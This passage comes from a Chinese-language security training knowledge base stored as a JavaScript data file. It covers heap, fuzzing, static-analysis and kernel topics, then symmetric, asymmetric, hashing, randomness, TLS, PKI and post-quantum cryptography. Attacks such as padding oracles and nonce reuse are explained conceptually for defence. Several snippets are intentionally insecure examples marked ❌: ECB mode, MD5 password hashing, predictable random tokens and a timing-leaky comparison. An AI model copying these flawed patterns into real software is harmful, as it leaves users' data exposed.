# 防御：PIE + NX + Canary + CET 全开，并及时修补内存漏洞`,
          tool: "pwntools、ROPgadget、GDB",
          refs: "ROP 技术；缓解机制综述"
        },
        {
          id: "bin-heap", name: "堆漏洞入门", level: "高级",
          summary: "堆没有栈那样的固定结构，漏洞利用更依赖分配器行为：UAF、溢出与双重释放是经典三件套。",
          keywords: ["堆","uaf","double free","堆溢出","分配器"],
          levels: {
            "入门": "栈是自动管理的，堆是程序自己申请释放的。释放后再用（UAF）或释放两次，就会踩到别人正在用的内存。",
            "初级": "常见类型：堆溢出（写越界）、UAF（释放后仍使用）、double free（重复释放）；后果可能是数据篡改或控制流劫持。",
            "中级": "实战：理解分配器（如 glibc 的 tcache/fastbin）的复用行为，才能判断「释放后内存会被谁用」；调试时观察 chunk 头与链表指针。",
            "高级": "深入：现代缓解（safe-linking、tcache 加固）提高了门槛但仍可组合利用；从防守看，优先用内存安全语言与静态分析减少此类漏洞。",
          },
          codeLang: "text",
          code:
`堆漏洞三类（记忆）
· 堆溢出：写超出分配大小 → 破坏相邻 chunk 元数据
· UAF：free 后继续使用 → 指针指向已被复用的内存
· Double Free：连续 free 同一指针 → 链表被破坏
调试观察点：chunk 头、bin 链表、分配/释放顺序`,
          tool: "GDB + pwndbg、ASAN",
          refs: "堆利用入门；glibc 分配器"
        },
        {
          id: "bin-fuzzing", name: "模糊测试入门", level: "中级",
          summary: "用大量变异输入找崩溃：覆盖率引导让 fuzzing 成为发现内存漏洞最有效的手段之一。",
          keywords: ["fuzzing","afl","覆盖率","崩溃","语料","sanitizer"],
          levels: {
            "入门": "模糊测试就是「自动疯狂喂各种奇怪输入」，看程序会不会崩。崩了往往意味着有漏洞。",
            "初级": "要素：种子语料（合理输入）、变异策略、覆盖率反馈（往没走过的分支探索）、以及 ASAN 等工具快速定位问题。",
            "中级": "实战：先跑出覆盖率再谈效率；崩溃要去重（同一根因只报一次）并最小化输入，便于开发复现修复。",
            "高级": "深入：持续 fuzzing（CI 里跑一段时间）、字典与协议感知变异提升深度、以及把发现的用例固化为回归用例。",
          },
          codeLang: "text",
          code:
`fuzzing 起步
1) 准备种子语料（真实样本更有用）
2) 用 ASAN 编译目标（内存错误即刻暴露）
3) 跑起来看覆盖率增长，不是只看崩溃数
4) 崩溃去重 + 输入最小化 → 提 issue
5) 用例入库 → 回归`,
          tool: "AFL++、libFuzzer、ASAN",
          refs: "模糊测试实践"
        },
        {
          id: "bin-static", name: "静态分析与模式识别", level: "中级",
          summary: "不运行程序也能找漏洞：从危险函数、输入边界与数据流入手，把「可疑点」缩小到可验证的几个。",
          keywords: ["静态分析","代码审计","危险函数","数据流","模式识别"],
          levels: {
            "入门": "静态分析就是「读代码找问题」。程序很大时，先找那些容易出事的函数（拷贝、格式化、解析），再看它们的输入从哪来。",
            "初级": "关注点：不受长度限制的拷贝（strcpy/sprintf/memcpy）、整数运算溢出、以及用户数据能否一路走到危险函数。",
            "中级": "实战：顺着数据流从「外部输入入口」（网络、文件、命令行）追到「危险操作」，能到就是候选漏洞；再用调试器验证是否真能触发。",
            "高级": "深入：用工具辅助（反编译交叉引用、静态分析器）提效，但要理解工具的局限（间接调用、结构体解析），关键结论必须动态验证。",
          },
          codeLang: "text",
          code:
`静态分析四步（实践顺序）
1) 找入口：网络 / 文件 / 命令行的数据从哪进来
2) 找出口：拷贝、格式化、解析、命令执行等危险点
3) 追路径：输入能否不带校验走到危险点
4) 动态验证：构造输入在调试器里确认是否真触发
`,
          tool: "Ghidra/IDA、静态分析器、GDB",
          refs: "代码审计与静态分析实践"
        },
        {
          id: "bin-kernel", name: "内核漏洞与提权", level: "高级",
          summary: "内核是权限的源头：内核漏洞可直接获得最高权限，且利用后果比用户态漏洞严重得多。",
          keywords: ["内核","提权","驱动","ioctl","内核漏洞"],
          levels: {
            "入门": "操作系统内核是管权限的地方。如果内核有漏洞，攻击者就能从普通用户直接变成管理员。",
            "初级": "常见类型：驱动对用户输入校验不足（ioctl 参数未校验）、越界读写、条件竞争、以及引用计数错误导致的释放后使用。",
            "中级": "实战：分析驱动时重点看「用户传入的缓冲区长度与指针是否被校验」，以及是否存在对用户态地址的直接访问（可能被映射操控）。",
            "高级": "深入：内核漏洞利用需要绕过更多保护（SMEP/SMAP、KASLR、CFI），门槛高但后果严重；防御方向是最小化驱动加载、及时更新、开启缓解机制。",
          },
          codeLang: "text",
          code:
`驱动审计关注点
· ioctl 参数是否校验长度/类型/指针来源
· 是否直接访问用户态地址（可能被操控）
· 引用计数与锁是否正确（防 UAF/竞争）
· 驱动来源与签名是否受控（禁止任意加载）
`,
          tool: "Ghidra、内核调试器、驱动签名策略",
          refs: "内核漏洞与提权实践"
        },
      ]
    },

    /* ---------------- 密码学 ---------------- */
    {
      id: "crypto", name: "密码学", icon: "🔐",
      desc: "从对称/非对称到哈希与协议层攻击，重在「正确实现」而非自创算法。",
      topics: [
        {
          id: "sym", name: "对称加密", level: "入门",
          summary: "AES 等算法用同一密钥加解密，关注模式与 IV。",
          keywords: ["对称加密","aes","des","分组密码","cbc","ecb","iv","初始化向量","流密码","填充"],
          levels: {
            "入门": "对称加密像一把钥匙锁门也开门。同一个密钥既能加密也能解密。关键是：钥匙要够长、不能重复使用「钥匙+随机数(IV)」组合，否则会被看出规律。",
            "初级": "AES（128/192/256）为主；模式：ECB（不安全，相同明文得相同密文）、CBC、CTR、GCM（带认证）。IV 必须随机且唯一；GCM 提供机密性+完整性。",
            "中级": "攻击：ECB 块重排/像素还原、CBC 填充 oracle（POODLE）、nonce 复用导致密钥流重用（CTR/GCM）。正确实现：随机 IV、验证 TAG、避免自定义组合。",
            "高级": "深入 AEAD 选择、密钥派生（HKDF/PBKDF2/Argon2）、侧信道（时序/缓存），以及为何「不要用 ECB、不要自研模式」。"
          },
          codeLang: "python",
          code:
`# ✅ 使用 AES-GCM（带认证，首选）
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os
key = AESGCM.generate_key(bit_length=256)
aes = AESGCM(key)
nonce = os.urandom(12)            # 每次必须唯一
ct = aes.encrypt(nonce, b"secret", b"")  # 后者为附加认证数据`,
          tool: "openssl、cryptography 库、CyberChef",
          refs: "NIST SP 800-38D（GCM）；cryptography 官方文档"
        },
        {
          id: "asym", name: "非对称加密与 RSA", level: "中级",
          summary: "公钥加密/私钥解密，重点在 RSA 数学与实现陷阱。",
          keywords: ["非对称","rsa","公钥","私钥","模数","因式分解","低指数","rsa攻击","padding"],
          levels: {
            "入门": "一对钥匙：公钥公开（用来加密/验签），私钥保密（用来解密/签名）。你用别人公钥加密，只有他的私钥能解开。RSA 的安全性建立在「大数分解很难」。",
            "初级": "RSA：n=p*q，e 与 φ(n) 互素，d 为逆元。加密 c=m^e mod n。常见坑：e 太小、p,q 接近（费马分解）、n 共享因子。",
            "中级": "攻击：共模攻击、低加密指数（广播）、Coppersmith 相关消息、Padding Oracle（PKCS#1 v1.5）、RSA 签名伪造。正确做法：用 OAEP 填充、足够随机化。",
            "高级": "理解 RSA 与离散对数（DH/ECC）的区别、侧信道（计时/功耗）、以及后量子迁移（Kyber 等）。强调：不要自己实现 RSA 数学。"
          },
          codeLang: "python",
          code:
`# ✅ 用库完成 RSA，且使用 OAEP 填充
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
ct = priv.public_key().encrypt(
    b"msg",
    padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))`,
          tool: "openssl、RsaCtfTool（授权）、sagemath",
          refs: "NIST/CRYPTREC 建议；《图解密码技术》"
        },
        {
          id: "hash", name: "哈希与消息认证", level: "初级",
          summary: "SHA 系列、HMAC、以及哈希误用（长度扩展/碰撞）。",
          keywords: ["哈希","hash","md5","sha1","sha256","hmac","消息认证","完整性","长度扩展","彩虹表","加盐"],
          levels: {
            "入门": "哈希像「数据的指纹」：任意内容变固定长度摘要，且难以反推。但 MD5/SHA1 已不安全（可人为制造碰撞），密码存储更不能直接哈希，要加盐或用专用算法。",
            "初级": "用途：完整性校验、口令存储（bcrypt/argon2/scrypt）、消息认证（HMAC）。不要用 MD5/SHA1 做安全用途；不要裸哈希存密码。",
            "中级": "攻击：MD5/SHA1 碰撞、SHA-256 长度扩展攻击（当把 secret 直接前置拼接时）、彩虹表（靠盐对抗）。正确：HMAC 而非 hash(secret+msg)。",
            "高级": "深入 Merkle–Damgård 结构弱点、选择前缀碰撞、以及密钥派生与认证标签的设计原则。"
          },
          codeLang: "python",
          code:
`# ✅ 消息认证用 HMAC，而非 hash(secret+msg)
import hmac, hashlib
tag = hmac.new(key, msg, hashlib.sha256).digest()
# ✅ 口令存储用 Argon2/bcrypt（见认证主题）
# ❌ 错误：md5(password) 直接存储`,
          tool: "hashcat、john、openssl dgst",
          refs: "NIST FIPS 180/198；OWASP 口令存储备忘"
        },
        {
          id: "rand", name: "随机数安全", level: "中级",
          summary: "弱随机数是密码系统的「阿喀琉斯之踵」。",
          keywords: ["随机数","random","prng","csprng","种子","可预测","熵","mt19937","rand"],
          levels: {
            "入门": "密码学需要的随机必须「不可预测」。普通程序里的随机数（如 rand()）是按固定规则算出来的，知道前面几个就能猜出后面，绝不能用在密钥、令牌、验证码上。",
            "初级": "区分：rand()/mt19937（可预测伪随机，仅用于非安全场景）vs CSPRNG（/dev/urandom、os.urandom、SecureRandom）。CTF 常考：用可预测种子还原密钥。",
            "中级": "攻击：种子泄露/可预测（时间、固定值）、状态恢复（MT 序列反推）、熵不足。正确：统一用操作系统提供的 CSPRNG。",
            "高级": "深入硬件 RNG、DRBG（NIST SP 800-90A）、以及随机数生成失败导致的协议级灾难（如密钥重用）。"
          },
          codeLang: "python",
          code:
`# ✅ 安全随机：CSPRNG
import secrets
token = secrets.token_hex(16)   # 用于令牌/密钥
# ❌ 危险：可预测的伪随机
import random
weak = random.randint(0, 2**32)  # 可被还原`,
          tool: "randcrack（教学 MT 恢复）、各语言安全随机 API",
          refs: "NIST SP 800-90A/B/C"
        },
        {
          id: "ecc", name: "椭圆曲线密码 ECC", level: "高级",
          summary: "椭圆曲线密码（ECDSA/EdDSA）的数学与实现陷阱。",
          keywords: ["椭圆曲线","ecc","ecdsa","ed25519","椭圆曲线密码","曲线","标量乘法","nonce复用"],
          levels: {
            "入门": "除了 RSA，现代密码学大量用「椭圆曲线」：用更短的密钥达到同等安全。ECDSA 签名用在比特币、TLS 等。它的安全同样依赖随机数（nonce）不可预测。",
            "初级": "ECDSA 签名 = (r, s)，依赖临时随机数 k。若同一 k 签了两条消息，可解出私钥（比特币历史事故）。EdDSA（Ed25519）把 nonce 定为哈希，天然避免复用。",
            "中级": "攻击：nonce 复用/可预测导致私钥泄露、弱曲线（如小子群）、曲线参数被投毒。正确：用标准曲线（P-256/25519）、EdDSA 优先、nonce 必须 CSPRNG 或确定性派生。",
            "高级": "深入椭圆曲线离散对数假设、无效曲线攻击、侧信道（非恒定时间标量乘法）、以及后量子迁移。不要自选曲线或自实现点运算。"
          },
          codeLang: "python",
          code:
`# ✅ 用成熟库做 ECDSA / Ed25519（不要手搓点运算）
from cryptography.hazmat.primitives.asymmetric import ec
priv = ec.generate_private_key(ec.SECP256R1())   # P-256 标准曲线
# Ed25519 由库提供，nonce 确定性派生，避免复用问题`,
          tool: "openssl、sagemath、ECC 计算器（授权）",
          refs: "NIST SP 800-186；RFC 7748/8032"
        },
        {
          id: "tls", name: "TLS 与密钥协商", level: "中级",
          summary: "TLS 握手、密钥协商（DH/ECDH）与常见配置缺陷。",
          keywords: ["tls","ssl","握手","密钥协商","dh","ecdh","降级攻击","中间人","证书","https"],
          levels: {
            "入门": "你访问 https 网站时，浏览器和服务器先「握手」协商出一把临时密钥，之后通信都加密。TLS 的目标就是防止别人偷看或篡改。老版本 SSL/早期 TLS 有已知漏洞，要用新版本。",
            "初级": "密钥协商：RSA 密钥交换（已不推荐，无前向安全）vs DH/ECDHE（临时密钥，前向安全）。证书链与信任锚。防御：启用 TLS1.2/1.3、禁用 SSLv3/TLS1.0、HSTS。",
            "中级": "攻击：降级攻击（POODLE/FREAK）、证书校验错误、弱 DH 参数（Logjam）、Heartbleed（已在资讯）。配置：强套件、ECDHE 优先、OCSP Stapling。",
            "高级": "深入 0-RTT 重放、TLS1.3 的密钥分离、证书透明度（CT）、以及混合量子密钥交换。TLS 安全 = 版本 + 套件 + 证书 + 配置 共同决定。"
          },
          codeLang: "bash",
          code:
`# ✅ 仅启用强协议与套件（nginx 示意）
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
ssl_prefer_server_ciphers off;
# 启用 HSTS
add_header Strict-Transport-Security "max-age=63072000" always;`,
          tool: "testssl.sh、Qualys SSL Labs、openssl s_client",
          refs: "Mozilla TLS 配置指南；RFC 8446（TLS1.3）"
        },
        {
          id: "pqc", name: "后量子密码 PQC", level: "高级",
          summary: "后量子密码（抗量子）迁移：Kyber/CRYSTALS 与混合密钥交换。",
          keywords: ["后量子","post quantum","量子","kyber","dilithium","lattice","格密码","抗量子","nist"],
          levels: {
            "入门": "量子计算机成熟后，今天用的 RSA/椭圆曲线可能被快速破解。后量子密码研究「即使面对量子计算机也安全」的算法，主流方向是「格密码」。",
            "初级": "NIST 标准化：Kyber（密钥封装 KEM）、Dilithium（签名）、以及 SPHINCS+。迁移策略常采用「混合」：传统 + 后量子同时协商，任一安全即可。",
            "中级": "关注：密钥/签名尺寸变大带来的性能与协议改动、移植到 TLS/IPsec/SSH 的工程挑战、以及「现在截获、未来解密」（harvest-now-decrypt-later）威胁。",
            "高级": "深入格问题（LWE/SIS）困难性假设、侧信道与实现健壮性、以及混合握手的具体构造。迁移是长期工程，但敏感数据保密期长的系统应现在就规划。"
          },
          codeLang: "python",
          code:
`# ✅ 概念示意：混合密钥交换（传统 ECDH + Kyber），任一带即可保密
# 实际用 liboqs / OpenSSL 3.0 提供提供者，切勿手搓
shared = ecdhe_shared_secret() + kyber_encaps(peer_pk).shared
key = HKDF(shared)   # 合并派生最终密钥`,
          tool: "Open Quantum Safe (liboqs)、BoringSSL/OpenSSL 后量子实验",
          refs: "NIST PQC 标准化；RFC 9180（HPKE）"
        },
        {
          id: "blockmode", name: "分组密码模式", level: "初级",
          summary: "ECB/CBC/CTR/GCM 等模式的选择与 IV/nonce 纪律，决定加密是否安全。",
          keywords: ["分组密码模式","cbc","ecb","ctr","gcm","cfb","ofb","iv","初始化向量","填充","padding","aeac","模式"],
          levels: {
            "入门": "加密算法一次只能处理固定长度（如 AES 16 字节）的数据。怎么加密更长的文件？要靠「模式」把多次加密串起来。模式选错，再强的算法也白搭——最朴素的 ECB 会把重复的明文块变成重复的密文块。",
            "初级": "常见模式：ECB（相同明文→相同密文，不安全，绝不用）、CBC（需随机 IV，串行）、CTR（可并行，靠 nonce）、GCM/CCM（AEAD，同时提供加密+完整性校验）。核心纪律：IV/nonce 必须随机且永不重复使用。",
            "中级": "攻击：ECB 块重排与图像还原、CBC 填充预言机（POODLE/Lucky13）、CTR/GCM 下 nonce 复用导致密钥流重用（一次性泄露明文异或）、CBC 字节翻转（改 IV 影响首块明文）。",
            "高级": "深入理解 AEAD 为何是默认选择、nonce 管理策略（计数 vs 随机）、以及为何「不要自己拼模式组合（如 CBC+MAC 顺序错）」。模式错误是密码学实现事故的最高频来源之一。"
          },
          codeLang: "python",
          code:
`# ✅ 优先使用 AEAD（GCM）：加密同时校验完整性
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os
key = AESGCM.generate_key(bit_length=128)
aes = AESGCM(key)
nonce = os.urandom(12)                        # 每次必须不同
ct = aes.encrypt(nonce, b"secret message", associated_data=None)
# ❌ 危险：ECB 模式（相同明文块→相同密文块，暴露结构）
# from cryptography.hazmat.primitives.ciphers import algorithms, modes
# cipher = Cipher(algorithms.AES(key), modes.ECB())`,
          tool: "cryptography 库、CyberChef、openssl",
          refs: "NIST SP 800-38A/38D；AES-GCM 使用规范"
        },
        {
          id: "pki", name: "数字证书与 PKI", level: "中级",
          summary: "X.509 证书、信任链与 CA 模型，以及证书校验与吊销要点。",
          keywords: ["证书","数字证书","pki","公钥基础设施","x509","ca","证书颁发机构","信任链","ssl证书","自签名","吊销","ocsp"],
          levels: {
            "入门": "你怎么确定「这个网站的公钥真的是它的」？靠证书：一个权威机构（CA）用它的私钥给网站公钥「签字担保」。浏览器内置了一堆受信 CA，顺着这条「信任链」就能验证网站身份。",
            "初级": "X.509 证书结构（主体、公钥、签发者、有效期、签名）。信任模型：根 CA→中间 CA→站点证书。校验要点：域名匹配、有效期、签名有效、吊销状态（CRL/OCSP）、不信任自签名。防御视角：私钥保护好、用受信 CA、启用 CT 日志。",
            "中级": "风险：CA 被攻破或误签发、域名验证（DCV）被绕过、证书透明（CT）缺失导致恶意证书难发现、OCSP 隐私/可用性问题（OCSP Stapling 缓解）。理解「信任锚」为何是系统安全根基。",
            "高级": "深入证书绑定（证书/公钥 pinning）、mTLS（双向认证）、以及后量子时代证书与混合密钥的演化。PKI 不解决「密钥是否真由持有者控制」，只是把身份与公钥绑定——密钥保管才是薄弱环节。"
          },
          codeLang: "bash",
          code:
`# 查看站点证书链与基本信息
openssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null | openssl x509 -noout -issuer -subject -dates
# 校验证书是否被吊销（OCSP）
openssl ocsp -issuer chain.pem -cert site.pem -url http://ocsp.example.com
# ✅ 部署建议：受信 CA 签发 + 启用 OCSP Stapling + 证书透明日志`,
          tool: "openssl、testssl.sh、证书透明日志（crt.sh）",
          refs: "RFC 5280（X.509）；RFC 6962（证书透明）"
        },
        {
          id: "crypto-misuse", name: "密码学原语误用", level: "中级",
          summary: "使用了正确算法却以错误方式使用（ECB、弱随机、自研算法、密钥硬编码）导致形同虚设。",
          keywords: ["密码学误用","ecb","弱随机","硬编码密钥","自定义算法","iv复用","padding"],
          levels: {
            "入门": "加密算法再强，用错了也白搭。比如用每个方块单独加密的模式，图案会暴露；或者用每次都不同的随机数却用了固定的，别人能反推。",
            "初级": "常见误用：ECB 模式（相同明文变相同密文，暴露结构）、IV 复用（CTR/GCM 下致命）、弱随机数（rand()/time 做密钥）、密钥硬编码在代码、用 MD5/SHA1 做密码哈希（应 bcrypt/argon2）、自研加密算法。",
            "中级": "实战：识别模式（看密文分块规律判断 ECB）；检查 IV/nonce 是否随机且唯一；密码存储必须用慢哈希加盐。正确组合：AES-GCM（认证加密）、RSA-OAEP（非 Textbook RSA）、Argon2 存密码。",
            "高级": "深入：非对称加密的填充预言（Bleichenbacher）、GCM nonce 复用导致明文恢复、以及密钥管理（KMS/信封加密）远比重算算法更重要。强调：密码学正确性的 90% 在用法与密钥管理，不在算法本身。"
          },
          codeLang: "python",
          code:
`# ❌ 危险：ECB 模式 + 弱随机 + 明文哈希
cipher = AES.new(key, AES.MODE_ECB)
h = hashlib.md5(password).hexdigest()   # 快哈希，易被彩虹表

# ✅ 安全：GCM 认证加密 + Argon2 存密码
cipher = AES.new(key, AES.MODE_GCM)
h = argon2.hash(password)                # 慢哈希 + 盐`,
          tool: "CyberChef、openssl、测试向量",
          refs: "NIST SP 800-38D；OWASP 密码存储备忘单"
        },
        {
          id: "side-channel", name: "侧信道攻击简介", level: "高级",
          summary: "不攻破算法本身，而是利用时间、功耗、电磁等物理泄露恢复密钥。",
          keywords: ["侧信道","timing attack","时序攻击","功耗分析","缓存攻击","旁路","dpa"],
          levels: {
            "入门": "有些密码校验算得越快说明越接近正确，攻击者靠测量耗时长短就能一点点猜出密码，不用真的破解算法。",
            "初级": "类型：时序攻击（比较字符串或解密是否恒定时间）、功耗分析（DPA/SPA）、缓存攻击（Flush+Reload）、电磁或声学泄露。经典：非恒定时间字符串比较导致口令逐字节泄露。",
            "中级": "实战：用恒定时间比较（crypto_verify）；注意分支或查表依赖密钥（避免密钥相关的内存访问模式）；测量响应时间差异推断。防护：恒定时间实现、盲化、噪声注入。",
            "高级": "深入：基于缓存的跨进程密钥恢复、Rowhammer 与侧信道结合、以及云多租户下的共置攻击。强调：侧信道证明逻辑正确不等于实现安全，高价值实现必须恒定时间。"
          },
          codeLang: "python",
          code:
`# ❌ 危险：非恒定时间比较（时长随匹配前缀增长）
def eq(a, b):
    for i in range(len(a)):
        if a[i] != b[i]: return False
    return True

# ✅ 安全：恒定时间比较
def eq_safe(a, b):
    return hmac.compare_digest(a, b)   # 无论差异在哪都花相同时间`,
          tool: "microbenchmark、缓存攻击 PoC",
          refs: "CWE-208（时序侧信道）；LadderLeak"
        },
        {
          id: "crypto-sym-asym", name: "对称与非对称加密", level: "入门",
          summary: "一把钥匙 vs 一对钥匙：对称快、非对称能安全交换密钥，实际系统两者配合使用。",
          keywords: ["对称加密","非对称加密","aes","rsa","密钥交换","混合加密"],
          levels: {
            "入门": "对称加密：加密和解密用同一把钥匙（快，但钥匙怎么安全给对方是个问题）。非对称加密：一把公开、一把自己留着（解决钥匙分发，但慢）。",
            "初级": "常见算法：对称 AES（分组密码，需配合模式与 IV）、非对称 RSA/ECC。实际系统用混合方案：用非对称协商出会话密钥，再用对称加密数据（如 TLS）。",
            "中级": "实战要点：对称加密必须用安全的模式（GCM 等 AEAD）与随机 IV，绝不能 ECB；非对称要注意填充（OAEP）与密钥长度；不要自己设计协议。",
            "高级": "深入：前后向保密（ECDHE）、密钥轮换、以及「加密不等于认证」——需要 AEAD 或签名保证完整性，否则可被篡改（padding oracle 类攻击）。",
          },
          codeLang: "text",
          code:
`混合加密（TLS 的简化流程）
1) 客户端与服务器用非对称算法协商出会话密钥
2) 之后的数据用对称算法（AES-GCM）加密传输
3) 用签名/证书证明「对方是谁」
要点：对称快、非对称解决分发，二者配合而非二选一`,
          tool: "OpenSSL、TLS 抓包分析",
          refs: "密码学基础；TLS 工作原理"
        },
        {
          id: "crypto-hash-store", name: "哈希与口令存储入门", level: "入门",
          summary: "哈希是单向指纹；存口令必须用慢哈希加盐（bcrypt/argon2），MD5/SHA 直接存等于没存。",
          keywords: ["哈希","加盐","bcrypt","argon2","彩虹表","口令"],
          levels: {
            "入门": "哈希像把肉绞成馅：能算出馅，但回不去肉。网站存口令应该存「哈希」而不是原文，这样即使库被偷也拿不到口令。",
            "初级": "为什么还要加盐：不加盐的哈希能被彩虹表批量反查，且相同口令哈希相同。慢哈希（bcrypt/argon2）让暴力破解的成本高到不划算。",
            "中级": "实战检查：口令字段是否用 bcrypt/argon2（含每用户盐与合适 cost）、是否有登录限速与锁定、重置流程是否可被枚举。MD5/SHA1 单次哈希一律判不合格。",
            "高级": "深入：理解 cost 参数与硬件的关系、口令喷洒（password spraying）的防御、以及「哈希不是加密」——不要用可逆加密存口令。",
          },
          codeLang: "python",
          code:
`# 口令存储的正确做法（示意）
import bcrypt
h = bcrypt.hashpw(pw.encode(), bcrypt.gensalt(rounds=12))
ok = bcrypt.checkpw(pw.encode(), h)

# 错误做法：md5(pw)、sha1(pw)、明文、Base64 —— 都可被批量破解`,
          tool: "bcrypt、argon2、hashcat（评估用）",
          refs: "OWASP 口令存储备忘单"
        },
        {
          id: "crypto-pki", name: "PKI 与证书信任链", level: "中级",
          summary: "证书把「公钥」和「身份」绑定起来，靠一串签发关系建立信任；链条上任何一环出问题都会导致信任失效。",
          keywords: ["pki","证书","ca","信任链","根证书","吊销"],
          levels: {
            "入门": "证书像身份证：由权威机构签发，证明「这个公钥确实属于这个网站」。浏览器信任的是一小撮根机构。",
            "初级": "信任链：根 CA → 中间 CA → 站点证书；校验包括签名有效、域名匹配、未过期、未吊销（CRL/OCSP）。",
            "中级": "实战：企业内代理抓包之所以可行，是因为把自签根证书装进了客户端信任库；因此要管控「谁能装根证书」（终端管理）。",
            "高级": "深入：证书透明度（CT）用于发现滥发证书、吊销机制的实际局限、以及证书生命周期自动化（ACME）带来的新风险点（私钥保管）。",
          },
          codeLang: "bash",
          code:
`# 查看站点证书链与有效期
openssl s_client -connect example.com:443 -showcerts </dev/null | openssl x509 -noout -dates -subject -issuer
# 关注：是否自签、是否过期、签发者是否符合预期`,
          tool: "OpenSSL、证书管理平台",
          refs: "PKI 基础；TLS 证书校验"
        },
        {
          id: "crypto-sign", name: "数字签名与验签", level: "初级",
          summary: "签名保证「内容没被改、确实来自私钥持有者」；它与加密方向相反，解决的是完整性与来源。",
          keywords: ["签名","验签","完整性","来源","私钥","公钥"],
          levels: {
            "入门": "签名像盖章：你用自己的私章盖章，别人用你公开的章样核对。内容改一个字，核对就不通过。",
            "初级": "常见算法：RSA-PSS、ECDSA、Ed25519。签名不提供机密性（内容仍是明文），只证明完整性与来源。",
            "中级": "实战：验签必须用「对方的公钥」且公钥来源可信（否则中间人可替换）；注意签名与加密不要混用同一对密钥。",
            "高级": "深入：注意签名重放（需带时间戳/随机数）、算法选择（避免已弃用的 MD5/SHA1 签名），以及签名体系与密钥生命周期管理。",
          },
          codeLang: "bash",
          code:
`# 签名与验签（示意）
openssl dgst -sha256 -sign priv.pem -out sig.bin file.txt
openssl dgst -sha256 -verify pub.pem -signature sig.bin file.txt
# 关键：pub.pem 必须来自可信渠道，否则验签无意义`,
          tool: "OpenSSL、GPG、国密工具",
          refs: "数字签名基础"
        },
        {
          id: "crypto-pqc", name: "后量子密码迁移", level: "高级",
          summary: "量子计算威胁当前公钥体系；迁移是长期工程，需要先盘点再用混合方案过渡。",
          keywords: ["后量子","pqc","抗量子","迁移","混合密钥","密码敏捷"],
          levels: {
            "入门": "现在的公钥算法（RSA/ECC）理论上会被未来的量子计算机破解。所以要提前准备换算法。",
            "初级": "威胁重点：先「现在收集、以后解密」（Harvest Now, Decrypt Later），因此长期保密数据要优先考虑。",
            "中级": "实战：先做密码资产盘点（哪些系统用了哪些算法、密钥长度、协议版本），再制定迁移优先级（长期机密 > 短期）。",
            "高级": "深入：过渡期用混合方案（传统 + 抗量子）兼顾兼容与安全，同时推进「密码敏捷性」——能快速替换算法的架构能力。",
          },
          codeLang: "text",
          code:
`迁移起步动作
1) 盘点：系统 / 算法 / 密钥长度 / 协议版本 / 数据保留期
2) 排序：数据保密期越长优先级越高
3) 过渡：混合密钥交换（传统 + 抗量子）
4) 能力：把算法做成可替换（密码敏捷）`,
          tool: "密码资产盘点工具、PQC 库",
          refs: "后量子迁移指南；NIST PQC"
        },
        {
          id: "crypto-kdf", name: "密钥派生与口令加固", level: "中级",
          summary: "从口令到密钥不能直接哈希：必须用 KDF（PBKDF2/bcrypt/argon2）加盐并设足够代价。",
          keywords: ["kdf","pbkdf2","bcrypt","argon2","盐","代价参数"],
          levels: {
            "入门": "人的口令很短，不能直接当密钥用。要用专门的函数（KDF）把它「拉伸」成密钥，并加上随机盐。",
            "初级": "选择：口令存储用 bcrypt/argon2；从口令派生加密密钥用 PBKDF2/scrypt/argon2 并设置合适迭代次数与内存开销。",
            "中级": "实战：检查有没有「直接 SHA256(口令) 当密钥」这种写法；确认盐是每用户随机且存储；代价参数要随硬件更新。",
            "高级": "深入：理解 KDF 与「加密密钥」的分层（用 KDF 派生主密钥 → 再用主密钥加密数据密钥），以及硬件加速对暴力破解的影响。",
          },
          codeLang: "python",
          code:
`# 从口令派生密钥（示意）
import hashlib, os
salt = os.urandom(16)
key = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, 600000, dklen=32)
# 错误：key = hashlib.sha256(pw.encode()).digest()  ← 无盐且太快`,
          tool: "bcrypt/argon2 库、hashcat（评估）",
          refs: "口令与 KDF 实践"
        },
        {
          id: "crypto-tls-practice", name: "TLS 配置实践与常见误区", level: "中级",
          summary: "TLS 不是「开了就安全」：协议版本、套件、证书校验与配置错误都会让保护失效。",
          keywords: ["tls","协议版本","套件","hsts","配置","误区"],
          levels: {
            "入门": "HTTPS 用的就是 TLS。它保护内容不被偷看，但配置不当（如允许过老版本）保护会打折。",
            "初级": "要点：禁用 SSLv3/TLS1.0/1.1、优先现代套件（AEAD）、启用 HSTS、证书正确配置并自动续期。",
            "中级": "实战：用扫描工具检查协议与套件、证书链完整性、以及是否支持不安全的重新协商；客户端侧要校验证书（不要随手忽略错误）。",
            "高级": "深入：注意「加密了但不完整」的问题（需 AEAD 或额外完整性保护）、前后向保密（优先 ECDHE）、以及内部服务之间常被忽略的 TLS 配置。",
          },
          codeLang: "bash",
          code:
`# 检查站点 TLS 配置（授权扫描）
openssl s_client -connect example.com:443 -tls1_1 </dev/null   # 是否仍支持老版本
# 或用专用扫描工具查看协议、套件、证书链与 HSTS`,
          tool: "sslscan/testssl、配置检查",
          refs: "TLS 配置最佳实践"
        },
        {
          id: "crypto-random", name: "随机数与熵源安全", level: "中级",
          summary: "密码学的安全性最终依赖「不可预测」；随机数用错，密钥与令牌全都能被推算出来。",
          keywords: ["随机数","熵","csprng","种子","可预测"],
          levels: {
            "入门": "加密要安全，前提是「别人猜不到你的密钥」。如果密钥是用可预测的方式生成的，加密就形同虚设。",
            "初级": "要点：安全场景必须用密码学安全随机数（CSPRNG）；以时间、进程号、可猜序列做种子都会导致可预测。",
            "中级": "实战检查：会话令牌、重置令牌、验证码、密钥生成是否都来自 CSPRNG；是否有自研随机算法；熵池是否充足（虚拟机与容器启动时尤其要注意）。",
            "高级": "深入：理解失败场景（熵不足时返回低质量随机、错误使用时间差）、以及随机数在签名（nonce 复用会直接泄露私钥）中的致命影响。",
          },
          codeLang: "text",
          code:
`随机数使用检查
· 令牌/密钥/IV/nonce 是否都来自 CSPRNG？
· 是否用时间戳、pid、自增序列做种子？
· 是否有自研「随机算法」？
· 容器/虚拟机启动阶段熵是否充足？
（nonce 复用会导致签名私钥泄露，属于致命错误）
`,
          tool: "CSPRNG / /dev/urandom、密钥库",
